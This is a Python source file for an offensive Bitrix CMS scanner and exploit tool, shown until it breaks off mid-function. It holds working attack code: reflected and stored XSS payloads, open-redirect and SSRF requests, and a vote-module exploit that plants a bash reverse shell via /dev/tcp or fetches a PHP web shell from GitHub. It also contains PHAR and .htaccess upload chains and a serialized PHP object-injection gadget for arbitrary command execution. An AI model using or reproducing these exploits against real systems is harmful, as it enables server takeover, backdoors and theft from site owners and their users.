import argparse
import http
import re
import os
import typing
import itertools
import http.server
from http.server import HTTPServer
from socketserver import ThreadingMixIn
import threading
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import requests
import json
from urllib.parse import urlparse, parse_qs, urlencode
import datetime
import time
import random
import string
import io
import pathlib
import sys
import subprocess


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


ascii_banner = f"""
.................0xxxxxxxxx@@@x..............
............xx...0xxxxxxxxxxxxxx@@@..........
.......x....xx...0xxxxxxxxxxxxxxxxxx@@.......
.....@@x....xx...0xxxxx..xxxxxxxxxxxxxx@0....
...xxxxx....xx...0xxxxx.......0xxxxxxxxxxx...
..@xxxxx0...xx...0xxxxx@@@@0.....0xxxxxxxx@0.
.xxxxxxx0...xx...0xxxxx.....@@0....xxxxxxxxx.
0xxxxxxx0...x0...0xxxxxx......x@....0xxxxxxxx
xxxxxxxx0...xx...0xxxxxxx@@....xx....xxxxxxxx
xxxxxxxx0...xx...0xxxxxxxxx0...0x....xxxxxxxx
xxxxxxxx0...0x....0xxxxxxxx....xx....xxxxxxxx
0xxxxxxxx....0@......xxx......xx....xxxxxxxxx
.xxxxxxxx@.....x@0..........@@0....xxxxxxxxx.
..xxxxxxxxxx......@@@@@@@@@0.....0@xxxxxxxx0.
...0xxxxxxxx@@x................@@xxxxxxxxx...
.....xxxxxxxxxxx@@@x.....0@@@@xxxxxxxxxx0....
.......xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.......
..........xxxxxxxxxxxxxxxxxxxxxxxxx..........
..............0xxxxxxxxxxxxxxx0..............
..................0xxxxxxx0..................

 ____  _ _        _        ____
| __ )(_) |_ _ __(_)_  __ / ___|  ___ __ _ _ __  _ __   ___ _ __
|  _ \| | __| '__| \ \/ / \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
| |_) | | |_| |  | |>  <   ___) | (_| (_| | | | | | | |  __/ |
|____/|_|\__|_|  |_/_/\_\ |____/ \___\__,_|_| |_|_| |_|\___|_|


The script scans common bitrix vulnerabilities.
You can also separately check RCE vulnerabilities (Object injection, Vote and CVE-2023-1713).
{bcolors.OKGREEN}Green color means potential vulnerability.{bcolors.ENDC}
{bcolors.WARNING}Yellow color means that request is blocked (403 status code).{bcolors.ENDC}
{bcolors.FAIL}Red color means nothing valuable is found.{bcolors.ENDC}

.............................................\n\n\n
        """

requests.packages.urllib3.disable_warnings()


class Formatter(argparse.RawDescriptionHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    pass


headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Bx-ajax': 'true'}


def print_header_scan(name):
    print(f"{bcolors.HEADER}{bcolors.BOLD}------------------------ {name} ------------------------{bcolors.ENDC}\n")


def print_header_rce(name):
    print(f"{bcolors.OKBLUE}{bcolors.BOLD}------------------------ {name} ------------------------{bcolors.ENDC}\n")


def print_ok(s):
    print(f"{bcolors.OKGREEN}{s}{bcolors.ENDC}")


def print_block(s):
    print(f"{bcolors.WARNING}{s}{bcolors.ENDC}")


def print_fail(s):
    print(f"{bcolors.FAIL}{s}{bcolors.ENDC}")


def get_composite_data(session, target):
    data = {}
    r = session.get(f'{target}bitrix/tools/composite_data.php', verify=False)
    if r.status_code != 200:
        print_fail(
            f'There is a composite data error. Status code {r.status_code}. Check out {target}bitrix/tools/composite_data.php')
        return None
    j_r = r.text.replace("'", "\"")
    try:
        d = json.loads(j_r)
    except json.decoder.JSONDecodeError:
        print_fail(
            f'There is an error while decoding response. Check out {target}bitrix/tools/composite_data.php')
        return None

    data['SERVER_TIME'] = int(d['SERVER_TIME'])
    data['SERVER_TZ_OFFSET'] = int(d['SERVER_TZ_OFFSET'])
    data['USER_TZ_OFFSET'] = int(d['USER_TZ_OFFSET'])
    data['bitrix_sessid'] = d['bitrix_sessid']
    return data


class Scanner:
    __admin_url_list = [
        "bitrix/components/bitrix/desktop/admin_settings.php",
        "bitrix/components/bitrix/map.yandex.search/settings/settings.php",
        "bitrix/components/bitrix/player/player_playlist_edit.php",
        "bitrix/tools/catalog_export/yandex_detail.php",
        "bitrix/tools/sale/basket_discount_convert.php",
        "bitrix/tools/sale/discount_reindex.php",
        "bitrix/tools/autosave.php",
        "bitrix/tools/get_catalog_menu.php",
        "bitrix/tools/upload.php",
        "ololo/?SEF_APPLICATION_CUR_PAGE_URL=/bitrix/admin/",
        "ololo/?SEF%20APPLICATION%20CUR%20PAGE_URL=/bitrix/admin/",
        "ololo/?SEF+APPLICATION%20CUR+PAGE[URL=/bitrix/admin/"
    ]

    __register_url_list = [
        "auth/?register=yes",
        "crm/?register=yes",
        "auth/oauth2/?register=yes",
        "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/board/my/index.php?register=yes",
        "bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/personal/profile/index.php?register=yes",
        "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes",
        "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php?register=yes",
        "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php?register=yes",
        "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php?register=yes&sf_EMAIL="
    ]

    __check_error_list = [
        "bitrix/admin/restore_export.php",
        "bitrix/admin/tools_index.php",
        "bitrix/bitrix.php",
        "bitrix/modules/main/ajax_tools.php",
        "bitrix/php_interface/after_connect_d7.php",
        "bitrix/themes/.default/.description.php",
        "bitrix/components/bitrix/main.ui.selector/templates/.default/template.php",
        "bitrix/components/bitrix/forum.user.profile.edit/templates/.default/interface.php"
    ]

    __rce_by_design_list = [
        "bitrix/admin/main_controller.php",
        "bitrix/admin/php_command_line.php"
    ]

    __content_spoofing_pg_list = [
        "bitrix/tools/imagepg.php?img=//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg",
        "bitrix/templates/learning/js/swfpg.php?img=//evil.host/evil.swf"
    ]

    __open_redirect_list = [
        "bitrix/redirect.php?goto=https://example.com%252F:123@google.com/",
        "bitrix/rk.php?goto=https://site%252F:123@google.com/",
        "bitrix/tools/track_mail_click.php?url=http://site%252F@google.com/"
    ]

    __xss_list = [
        "bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'",
        "bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00'}};alert(document.domain);if(1){//",
        "bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.location)%3B%7D%3B//%3C/div%3E",
        "bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20onerror%E2%80%A9=alert(document.domain)%20src=1%3E"
    ]

    def __init__(self, session, target, ssrf_url):
        self.__session = session
        self.__target = target
        self.__ssrf_url = ssrf_url
        self.__bitrix_data = None

    def get_admin_interface(self):
        print_header_scan("Bitrix admin interfaces available:")

        for url in self.__admin_url_list:
            u = self.__target + url
            r = self.__session.get(u, verify=False)
            if "Авторизация" in r.text and r.status_code == 200:
                print_ok(f"{u} is available. There is authorisation")
            else:
                print_fail(f"There is no admin panel on {u}. Status code: {r.status_code}")
        print('\n')

    def get_register_interface(self):
        print_header_scan("Bitrix register interfaces available:")

        for url in self.__register_url_list:
            u = self.__target + url
            r = self.__session.get(u, verify=False)
            if "Регистрация" in r.text and r.status_code == 200:
                print_ok(f"{u} is available. There is registration")
            else:
                print_fail(
                    f"There is no registration interface on {u}. Status code: {r.status_code}")
        print('\n')

    def get_register_globals(self):
        print_header_scan("Register Globals:")

        r = self.__session.get(f'{self.__target}?USER_FIELD_MANAGER=1', verify=False)
        if r.status_code >= 500:
            print_ok(f"Error message: \n{r.text}")
        else:
            print_fail(f"No error. Status code: {r.status_code}")
        print('\n')

    def get_license_key(self):
        print_header_scan("License key:")

        r = self.__session.get(f'{self.__target}bitrix/license_key.php', verify=False)
        if r.status_code == 200 and len(r.text) > 0:
            print_ok(r.text)
        else:
            print_fail(f"License key is not available. Status code: {r.status_code}")
        print('\n')

    def get_rce_by_design(self):
        print_header_scan("RCE by design:")

        for url in self.__rce_by_design_list:
            u = self.__target + url
            r = self.__session.get(u, verify=False)
            if r.status_code == 200 and "Авторизация" in r.text:
                print_ok(f"{u} has authorisation")
            elif r.status_code == 403:
                print_block(f"{u} is forbidden")
            else:
                print_fail(f"{u} is NOT available. Status code: {r.status_code}")
        print('\n')

    def get_full_path_disclosure(self):
        print_header_scan("Full Path Disclosure")

        for url in self.__check_error_list:
            u = self.__target + url
            r = self.__session.get(u, verify=False)
            if not (400 <= r.status_code < 500) and (re.search(r'failed|warning|error', r.text, flags=re.I | re.M) or (
                    r.status_code >= 500 and len(r.text) > 0)):
                print_ok(f"Error in {u}")
        print('\n')

    def get_content_spoofing1(self):
        print_header_scan("Content Spoofing (mobileapp.list):")

        url = f"{self.__target}bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=TEXT+INJECTION!+PLEASE+CLICK+HERE!&items[1][DETAIL_LINK]=http://google.com"
        o = urlparse(url)
        query = parse_qs(o.query)
        url_without_params = o._replace(query=None).geturl()
        r = self.__session.get(url_without_params, params=query, verify=False)
        if r.status_code == 200 and "MAPP_ML_MOBILEAPP_NOT_INSTALLED" in r.text:
            print_fail(f"{url} is NOT exploitable")
        elif r.status_code == 403:
            print_block(f"{url} is forbidden")
        elif r.status_code == 200 and "TEXT INJECTION! PLEASE CLICK HERE!" in r.text:
            print_ok(f"{url} has content spoofing")
        else:
            print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def get_content_spoofing2(self):
        print_header_scan("Content Spoofing (pg.php):")

        for url in self.__content_spoofing_pg_list:
            url = self.__target + url
            o = urlparse(url)
            query = parse_qs(o.query)
            url_without_params = o._replace(query=None).geturl()
            r = self.__session.get(url_without_params, params=query, verify=False)
            if r.status_code == 200 and re.search(
                    r'//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg|//evil.host/evil.swf', r.text,
                    flags=re.I | re.M):
                print_ok(f"{url} has content spoofing")
            elif r.status_code == 403:
                print_block(f"{url} is forbidden")
            else:
                print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def do_open_redirect(self):
        print_header_scan("Open Redirect ( LocalRedirect ):")

        for url in self.__open_redirect_list:
            url = self.__target + url
            o = urlparse(url)
            query = parse_qs(o.query)
            url_without_params = o._replace(query=None).geturl()
            r = self.__session.get(url_without_params, params=query, allow_redirects=False, verify=False)
            if r.status_code == 302:
                print_ok(f"{url} has redirecting")
            elif r.status_code == 403:
                print_block(f"{url} is forbidden")
            else:
                print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def do_xss(self):
        print_header_scan("Reflected XSS ( map.google.view, photogallery_user and etc ):")

        for url in self.__xss_list:
            url = self.__target + url
            o = urlparse(url)
            query = parse_qs(o.query)
            url_without_params = o._replace(query=None).geturl()
            r = self.__session.get(url_without_params, params=query, verify=False)
            if r.status_code == 200 and re.search(r'alert\(document.domain\)', r.text, flags=re.I | re.M):
                print_ok(f"{url} return XSS payload")
            elif r.status_code == 403:
                print_block(f"{url} is forbidden")
            else:
                print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def do_store_xss(self):
        print_header_scan("Stored Cross-Site Scripting (XSS) via File Upload. XSS works only with Apache server:")

        cid = random.randint(0, pow(10, 5))
        site_id = "s1"
        resp = self.__session.post(
            f"{self.__target}desktop_app/file.ajax.php?action=uploadfile",
            headers={
                "X-Bitrix-Csrf-Token": self.__bitrix_data['bitrix_sessid'],
                "X-Bitrix-Site-Id": site_id,
            },
            data={
                "bxu_info[mode]": "upload",
                "bxu_info[CID]": str(cid),
                "bxu_info[filesCount]": "1",
                "bxu_info[packageIndex]": f"pIndex{cid}",
                "bxu_info[NAME]": f"file{cid}",
                "bxu_files[0][name]": f"file{cid}",
            },
            files={
                "bxu_files[0][default]": (
                    "file",
                    "<script>alert(document.domain)</script>",
                    "text/plain",
                )
            },
            verify=False,
        )
        # if "nginx" in resp.headers['server']:
        #     print(f"{bcolors.FAIL}Not vulnerable{bcolors.ENDC}")
        #     print('\n')
        #     return
        try:
            resp_json = resp.json()
            path = resp_json["files"][0]["file"]["files"]["default"]["tmp_name"]
            print_ok(f"Uploaded file to {path}")
            relpath = path[path.index("/upload"):]
            print_ok(f"Check out {self.__target}{relpath} for XSS!")
        except Exception:
            # Get current system exception
            ex_type, _, _ = sys.exc_info()
            if resp.status_code == 404 or (resp.status_code == 200 and not resp.text):
                print_fail("Not vulnerable")
            else:
                print_fail(f"Error: {ex_type}")
        print('\n')

    def do_ssrf_attack1(self):
        print_header_scan("Server-Side Request Forgery ( main.urlpreview ):")

        url = f"{self.__target}bitrix/components/bitrix/main.urlpreview/ajax.php"
        data = {'sessid': self.__bitrix_data['bitrix_sessid'], 'userFieldId': 1, 'action': 'attachUrlPreview',
                'url': f"{self.__ssrf_url}main.urlpreview"}
        r = self.__session.post(url, data=data, verify=False)
        if r.status_code == 200:
            print_ok("Request was sent")
        elif r.status_code == 403:
            print_block(f"{url} is forbidden")
        else:
            print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def do_ssrf_attack2(self):
        print_header_scan("Server-Side Request Forgery ( html_editor_action.php ):")

        url = f"{self.__target}bitrix/tools/html_editor_action.php"
        data = {'sessid': self.__bitrix_data['bitrix_sessid'], 'action': 'video_oembed',
                'video_source': f"{self.__ssrf_url}html_editor_action"}
        r = self.__session.post(url, data=data, verify=False)
        if r.status_code == 200:
            print_ok("Request was sent")
        elif r.status_code == 403:
            print_block(f"{url} is forbidden")
        else:
            print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def do_ssrf_attack3(self):
        print_header_scan("Server-Side Request Forgery ( ajax services ):")

        url = f"{self.__target}bitrix/services/main/ajax.php?action=attachUrlPreview&show_actions=y&buildd_preview=y&die_step=3&admin_section=Y&show_cache_stat1=Y&clear_cache=Y&c=bitrix:main.urlpreview&mode=ajax&=&sessid={self.__bitrix_data['bitrix_sessid']}&signedParamsString=1.12&listSubscribeId[]=1&itemId=1&deleteSubscribe=Y&userFieldId=0&elementId=1"
        o = urlparse(url)
        query = parse_qs(o.query)
        url = o._replace(query=None).geturl()
        data = {'url': self.__ssrf_url + "index.php?id=1"}
        r = self.__session.post(url, params=query, data=data, verify=False)
        if r.status_code == 200:
            print_ok("Request was sent")
        elif r.status_code == 403:
            print_block(f"{url} is forbidden")
        else:
            print_fail(f"{url} is NOT available. Status code: {r.status_code}")
        print('\n')

    def scan(self):
        self.__bitrix_data = get_composite_data(self.__session, self.__target)
        self.get_admin_interface()
        self.get_register_interface()
        self.get_register_globals()
        self.get_license_key()
        self.get_rce_by_design()
        self.get_full_path_disclosure()
        self.get_content_spoofing1()
        self.get_content_spoofing2()
        self.do_open_redirect()
        self.do_xss()
        if self.__bitrix_data:
            self.do_store_xss()
            self.do_ssrf_attack1()
            self.do_ssrf_attack2()
            self.do_ssrf_attack3()


class RCEVote:

    def __init__(self, session, target, agent_id, webshell, path_to_file, lhost='', lport=''):
        self.__session = session
        self.__target = target
        self.__agent_id = agent_id
        self.__webshell = webshell
        self.__path_to_file = path_to_file
        self.__lhost = lhost
        self.__lport = lport

    def get_random_string(self, length):
        result_str = ''.join(random.choice(string.ascii_letters) for _ in range(length))
        return result_str

    def check_uploaded_file(self, uploaded_file, rand_name):
        r = self.__session.get(uploaded_file, verify=False)
        if r.status_code == 200:
            if self.__webshell:
                if "Web Shell" in r.text:
                    return True
            else:
                if rand_name in r.text:
                    return True
        return False

    def reverse_shell_payload(self, params, agent_value):

        endpoint = "bitrix/tools/vote/uf.php"

        bitrix_data = get_composite_data(self.__session, self.__target)
        if not bitrix_data:
            return
        bitrix_sessid = bitrix_data['bitrix_sessid']
        files = ()
        if bitrix_sessid:
            for i in range(2):
                if i == 0:
                    files = (
                        (f'bxu_files[{agent_value}][NAME]',
                         (None, f'system(\'/bin/bash -c "bash -i >& /dev/tcp/{self.__lhost}/{self.__lport} 0>&1"\');')),
                        # (f'bxu_files[{agent_value}][NAME]', (None, f"""system('php -r \\\'$s=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");\\\'');""")),
                        # field name 					filename 	file object content-type
                        (f'bxu_files[{agent_value}][NAME]', ('image.jpg', '123', 'image/jpeg')),
                        ('bxu_info[packageIndex]', (None, 'pIndex101')),
                        ('bxu_info[mode]', (None, 'upload')),
                        ('sessid', (None, bitrix_sessid)),
                        ('bxu_info[filesCount]', (None, '1')),
                    )
                if i == 1:
                    date_unix = bitrix_data['SERVER_TIME'] + bitrix_data['SERVER_TZ_OFFSET'] + 20
                    date_next_exec = datetime.datetime.fromtimestamp(date_unix, datetime.timezone(datetime.timedelta(0),
                                                                                                  'GMT')).strftime(
                        '%d.%m.%Y %H:%M:%S')
                    # Body for the second request to change agent time
                    files = (
                        (f'bxu_files[{agent_value}][NEXT_EXEC]', (None, date_next_exec)),
                        # field name 					filename 	file object content-type
                        (f'bxu_files[{agent_value}][NAME]', ('image.jpg', '123', 'image/jpeg')),
                        ('bxu_info[packageIndex]', (None, 'pIndex101')),
                        ('bxu_info[mode]', (None, 'upload')),
                        ('sessid', (None, bitrix_sessid)),
                        ('bxu_info[filesCount]', (None, '1')),
                    )

                url = f"{self.__target}{endpoint}"
                r = self.__session.post(url, params=params, files=files, verify=False)

                if r.status_code != 200:
                    return False
            return True

    def run(self):
        print_header_rce("Arbitrary Object Instantiation ( vote/uf.php )")
        bitrix_data = get_composite_data(self.__session, self.__target)
        if not bitrix_data:
            return
        bitrix_sessid = bitrix_data['bitrix_sessid']

        target_url = self.__target[:-1]

        endpoint = "/bitrix/tools/vote/uf.php"
        # end1 = "attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote"

        query = [
            ("attachId[ENTITY_TYPE]", "CFileUploader"),
            ("attachId[ENTITY_ID][events][onFileIsStarted][]", "CAllAgent"),
            ("attachId[ENTITY_ID][events][onFileIsStarted][]", "Update"),
            ("attachId[MODULE_ID]", "vote"),
            ("action", "vote"),
        ]

        if self.__agent_id == 1:
            agent_value = "f"
        elif self.__agent_id == 2:
            agent_value = "1"
        elif self.__agent_id == 3:
            agent_value = "343"
        elif self.__agent_id == 4:
            agent_value = "r"
        elif self.__agent_id == 5:
            agent_value = "zxc"
        elif self.__agent_id == 6:
            agent_value = "m"
        elif self.__agent_id == 7:
            agent_value = "u"
        elif self.__agent_id == 8:
            agent_value = "dfgdfg"
        else:
            agent_value = "x"

        # success = False

        url = f"{target_url}{endpoint}"

        query2 = urlencode(query, safe='[]')

        if self.__path_to_file:
            # append slash at start
            if self.__path_to_file[0] != "/":
                self.__path_to_file = "/" + self.__path_to_file

            # append slash at end
            if self.__path_to_file[-1] != "/":
                self.__path_to_file += "/"
        else:
            self.__path_to_file = "/"

        # Generate random name for uploading file.
        rand_name = self.get_random_string(12)
        uploaded_file = f"{target_url}{self.__path_to_file}{rand_name}.txt"

        count = 0
        files = ()
        # Loop for sending two requests.
        for i in range(2):
            if i == 0:
                if self.__webshell:
                    # Request Body to add agent that will download the web reverse shell
                    uploaded_file = f"{target_url}{self.__path_to_file}{rand_name}.php"

                    files = (
                        (f'bxu_files[{agent_value}][NAME]', (None,
                                                             f'file_put_contents($_SERVER[\'DOCUMENT_ROOT\']."{self.__path_to_file}{rand_name}.php", fopen("https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php", "r"));')),
                        (f'bxu_files[{agent_value}][NAME]', ('image.jpg', '123', 'image/jpeg')),
                        ('bxu_info[packageIndex]', (None, 'pIndex101')),
                        ('bxu_info[mode]', (None, 'upload')),
                        ('sessid', (None, bitrix_sessid)),
                        ('bxu_info[filesCount]', (None, '1')),
                    )
                else:
                    # Request Body to add agent that will create dummy file to check if target is vulnerable
                    files = (
                        (f'bxu_files[{agent_value}][NAME]', (None,
                                                             f'file_put_contents($_SERVER[\'DOCUMENT_ROOT\']."{self.__path_to_file}{rand_name}.txt", "{rand_name}' + r'\n");')),
                        (f'bxu_files[{agent_value}][NAME]', ('image.jpg', '123', 'image/jpeg')),
                        ('bxu_info[packageIndex]', (None, 'pIndex101')),
                        ('bxu_info[mode]', (None, 'upload')),
                        ('sessid', (None, bitrix_sessid)),
                        ('bxu_info[filesCount]', (None, '1')),
                    )
            if i == 1:
                date_unix = bitrix_data['SERVER_TIME'] + bitrix_data['SERVER_TZ_OFFSET'] + 20
                date_next_exec = datetime.datetime.fromtimestamp(date_unix,
                                                                 datetime.timezone(datetime.timedelta(0),
                                                                                   'GMT')).strftime(
                    '%d.%m.%Y %H:%M:%S')
                # Body for the second request to change agent time
                files = {
                    f'bxu_files[{agent_value}][NEXT_EXEC]': (None, date_next_exec),
                    # field name 					filename 	file object content-type
                    f'bxu_files[{agent_value}][NAME]': ('image.jpg', '123', 'image/jpeg'),
                    'bxu_info[packageIndex]': (None, 'pIndex101'),
                    'bxu_info[mode]': (None, 'upload'),
                    'sessid': (None, bitrix_sessid),
                    'bxu_info[filesCount]': (None, '1')
                }

            r = self.__session.post(url, params=query2, files=files, verify=False)

            if r.status_code == 200:
                if not len(r.text):
                    print_fail("Vote agent module is not vulnerable.")
                    return
                else:
                    if "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector" in r.text:
                        print_fail(f"Vote agent module is not vulnerable.")
                        return
                    if "The copy name is not in the list" in r.text:
                        count += 1
            elif r.status_code == 404:
                print_fail("Vote agent module is not vulnerable.")
                return

        print_ok("Vote agent might be vulnerable! Waiting 60 sec for agent activation...")
        if count == 2:
            print_ok("If attack will not work check out another path. Add argument --path")
        time.sleep(60)

        success = self.check_uploaded_file(uploaded_file, rand_name)

        if success and self.__webshell:
            print_ok(
                f"The target's vote module is vulnerable! Web shell is uploaded, check {uploaded_file}")
            return
        elif success and not self.__webshell:
            print_ok(
                "The target's vote module is vulnerable! Preparing reverse shell connection.")
            time.sleep(10)

            err = self.reverse_shell_payload(query2, agent_value)

            time.sleep(15)
            if not err:
                print_fail("Unable to establish reverse shell connection")

        else:
            for counter in range(3):
                print_fail(f"Failed, trying one more time... {counter + 1}")
                time.sleep(3)
                success = self.check_uploaded_file(uploaded_file, rand_name)
                if success and self.__webshell:
                    print_ok(
                        f"The target's vote module is vulnerable! Web shell is uploaded, check {uploaded_file}")
                    return
                if success and not self.__webshell:
                    print_ok(
                        "The target's vote module is vulnerable! Preparing reverse shell connection.")
                    time.sleep(10)

                    err = self.reverse_shell_payload(query2, agent_value)

                    time.sleep(15)
                    if not err:
                        print_fail(f"Unable to establish reverse shell connection")
                    return
            print_fail(f"The target's vote agent might be dead, try another vote agent's ID!")


class RCEVoteUpload:

    def __init__(self, session, target, payload, payload_name):
        self.__session = session
        self.__target = target
        self.__payload = payload
        self.__payload_name = payload_name

    def make_file(self, name, content):
        f = io.BytesIO(content)
        f.name = name
        return f

    def upload_files(self, sessid, payloads):
        cid = "CID" + str(random.randint(1000000000000, 9999999999999))
        pindex = "pIndex" + str(random.randint(1000000000000, 9999999999999))

        files = {
            "bxu_info[CID]": (None, cid),
            "bxu_info[packageIndex]": (None, pindex),
            "bxu_info[filesCount]": (None, str(len(payloads))),
            "bxu_info[mode]": (None, "upload"),
        }

        params = {
            "attachId[MODULE_ID]": "iblock",
            "attachId[ENTITY_TYPE]": "CFileUploader",
            "action": "vote",
            "sessid": sessid,
        }

        for i, f in enumerate(payloads):
            files[f"bxu_files[{i}][name]"] = (None, "1")
            files[f"bxu_files[{i}][{f.name}]"] = f
            params[f"attachId[ENTITY_ID][copies][{f.name}]"] = "1"

        r = self.__session.post(
            f"{self.__target}bitrix/tools/vote/uf.php",
            params=params,
            files=files,
            verify=False,
        )

        paths = {}

        try:
            data = r.json()
            for fname, info in data["files"][0]["file"]["files"].items():
                if fname == "default":
                    continue
                paths[fname] = info["tmp_name"]
        except Exception:
            if not len(r.text):
                raise Exception(
                    f"Fail to upload files, bad response. Empty body response. Status code: {r.status_code}")
            raise Exception(f"Fail to upload files, bad response. Status code: {r.status_code}")

        return paths

    def run_phar(self):
        print_header_rce("RCE using PHAR deserialization ( vote/uf.php )")
        bitrix_data = get_composite_data(self.__session, self.__target)
        if not bitrix_data:
            return
        sessid = bitrix_data['bitrix_sessid']

        print_ok("Uploading PHAR")
        paths = self.upload_files(
            sessid,
            [
                self.make_file(self.__payload_name, self.__payload.read())
            ]
        )

        path = paths[self.__payload_name]

        params = {
            "attachId[MODULE_ID]": "iblock",
            "attachId[ENTITY_TYPE]": "Phar",
            "attachId[ENTITY_ID]": path,
            "action": "vote",
            "sessid": sessid,
        }

        print_ok("Access uploaded PHAR to trigger unserialize. Checking a deserialization...")
        r = self.__session.post(
            f"{self.__target}bitrix/tools/vote/uf.php",
            params=params,
            verify=False,
        )

        if r.status_code == 200:
            if len(r.text):
                if ("Connector class should be instance of Connector" in r.text) or (
                        "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector" in r.text):
                    print_fail("Vote agent module for phar deserialization is not vulnerable.")
                    return
                elif 'Error' in r.text:
                    print_fail(
                        f"There is error. Status code: {r.status_code}. Response text: {r.text}")
                    return
                else:
                    print_ok(f"Vulnerable: {r.text}")
            else:
                print_fail("Not vulnerable")
        else:
            print_fail(f"There is error. Status code: {r.status_code}. Response text: {r.text}")

    def run_htaccess(self):
        print_header_rce("RCE using .htaccess and shell upload ( vote/uf.php )")
        bitrix_data = get_composite_data(self.__session, self.__target)
        if not bitrix_data:
            return
        sessid = bitrix_data['bitrix_sessid']

        ext = pathlib.Path(self.__payload_name).suffix

        paths = self.upload_files(
            sessid,
            [
                self.make_file(self.__payload_name, self.__payload.read()),
                self.make_file(
                    "../.htaccess", f"AddHandler application/x-httpd-php {ext}\n".encode()
                ),
            ],
        )
        try:
            parts = paths[self.__payload_name].split("/")
            shell_path = "/".join(parts[parts.index("upload"):])
            print_ok(f"Success! Shell path {self.__target}{shell_path}")
        except Exception as e:
            print_fail(f"Error: {str(e)}")


class ObjectInjection:
    def __init__(self, session, target, function, command):
        self.__session = session
        self.__target = target
        self.__function = function
        self.__command = command

    def convert_str_for_payload(self, str):
        byte_array = bytes(str, "utf-8")
        return ''.join(f'\\{byte:02x}' for byte in byte_array)

    def get_payload_for_object(self):
        return r'O:27:"Bitrix\Main\ORM\Data\Result":3:{S:12:"\00*\00isSuccess";b:0;S:20:"\00*\00wereErrorsChecked";b:0;S:9:"\00*\00errors";O:27:"Bitrix\Main\Type\Dictionary":1:{S:9:"\00*\00values";a:1:{i:0;O:17:"Bitrix\Main\Error":1:{S:10:"\00*\00message";O:36:"Bitrix\Main\UI\Viewer\ItemAttributes":1:{S:13:"\00*\00attributes";O:29:"Bitrix\Main\DB\ResultIterator":3:{S:38:"\00Bitrix\5CMain\5CDB\5CResultIterator\00counter";i:0;S:42:"\00Bitrix\5CMain\5CDB\5CResultIterator\00currentData";i:0;S:37:"\00Bitrix\5CMain\5CDB\5CResultIterator\00result";O:26:"Bitrix\Main\DB\ArrayResult":2:{S:11:"\00*\00resource";a:1:{i:0;a:2:{i:0;S:' + str(
            len(self.__command)) + r':"' + self.convert_str_for_payload(
            self.__command) + r'";i:1;s:1:"x";}}S:13:"\00*\00converters";a:2:{i:0;S:' + str(
            len(self.__function)) + r':"' + self.convert_str_for_payload(
            self.__function) + r'";i:1;s:17:"WriteFinalMessage";}}}}}}}}'

    def run(self):
        print_header_rce("RCE via PHP Object Injection ( html_editor_action.php )")
        bitrix_data = get_composite_data(self.__session, self.__target)
        if not bitrix_data:
            return
        bitrix_sessid = bitrix_data['bitrix_sessid']

        url = f"{self.__target}bitrix/tools/html_editor_action.php"
        files = {
            'bxu_files[.][files][code]': (None, 'default'),
            # field name 				filename 		file object 						 content-type
            'bxu_files[.][default]': ('image.jpg', self.get_payload_for_object(), 'image/jpeg'),
            'bxu_info[CID]': (None, '1'),
            'bxu_info[packageIndex]': (None, 'pIndex101'),
            'bxu_info[mode]': (None, 'upload'),
            'action': (None, 'uploadfile'),
            'sessid': (None, bitrix_sessid),
            'bxu_info[filesCount]': (None, '1')
        }

        r = self.__session.post(url, files=files, verify=False)
        if r.status_code != 403 and r.status_code != 404:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = f"bxu_info[packageIndex]=pIndex101&action=uploadfile&bxu_info[mode]=upload&sessid={bitrix_sessid}&bxu_info[filesCount]=1&bxu_info[CID]=default%00"
            r = self.__session.post(url, data=data, headers=headers, verify=False)
            print_ok(f'Response status code: {r.status_code}\n')
            if r.text:
                print_ok(f'Response body:\n\n{r.text}\n\n')
            else:
